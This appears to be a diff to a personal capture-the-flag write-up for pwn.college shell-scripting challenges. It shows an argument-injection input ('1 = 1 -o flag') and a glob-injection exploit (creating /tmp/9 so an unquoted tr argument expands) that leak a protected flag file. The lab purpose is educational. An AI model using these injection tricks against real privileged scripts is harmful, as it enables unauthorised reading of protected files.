@@ -65,3 +65,21 @@ echo "Goodbye!"
 /challenge/run "1 = 1 -o flag"
 ```
 due to unquoted expansion, was able to substitute $1 with any string
+
+# Globbing Harmony
+
+### chall
+```sh
+#!/usr/bin/env -iS /opt/pwn.college/sh
+
+PATH=/usr/bin
+cd /tmp
+cat /flag | tr -d [A-Za-z0-9]
+```
+
+### exploit
+```sh
+touch /tmp/9
+/challenge/run
+```
+"filename expansion" is used in tr command, which replaces that glob with matching file name, in our case by 9, and then truncates only character '9'.
